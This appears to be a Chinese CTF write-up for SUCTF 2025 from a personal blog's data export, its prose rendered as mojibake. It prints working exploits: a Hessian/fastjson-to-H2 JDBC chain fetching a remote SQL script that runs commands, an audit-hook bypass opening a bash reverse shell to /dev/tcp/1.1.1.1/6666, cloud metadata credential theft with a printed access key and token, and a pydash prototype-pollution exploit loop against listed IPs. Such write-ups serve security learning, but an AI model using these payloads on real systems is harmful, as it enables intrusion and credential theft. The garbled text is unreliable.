¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 å‹é“¾åç§°2 å‹é“¾æè¿°2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"å‹é“¾"},{"categories":null,"contents":"ä¸€åå¤§äºŒåœ¨è¯»å­¦ç”Ÿ\nSyclover \u0026amp; 0XFFF æˆå‘˜\nå¯¹å„ç§å®‰å…¨æ„Ÿå…´è¶£ï¼Œç›®å‰ä¸»è¦å­¦ä¹ çš„è¿˜çš„æ˜¯Webå®‰å…¨ï¼ˆJava å®‰å…¨ã€äº‘å®‰å…¨ç­‰ï¼‰\næœ€çˆ±åƒï¼Œæœ€å–œæ¬¢åƒçš„æ˜¯ğŸ‰ï¼Œæœ€å–œæ¬¢å¹²çš„äº‹æƒ…å°±æ˜¯å¤§å¤å¤©æŠ±ç€åŠä¸ªè¥¿ç“œæ‹¿å‹ºå­æŒ–ç€åƒç„¶åçœ‹è§†é¢‘\nä¼šæ‰“ç‚¹å°æ¸¸æˆï¼ˆå…¶å®ä»å°å­¦ä¹‹å‰å°±å¼€å§‹æ‰“æ¸¸æˆäº†hh\nä»€ä¹ˆéƒ½æƒ³å­¦ï¼Œä½†ä»€ä¹ˆéƒ½ä¸ä¼š\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ 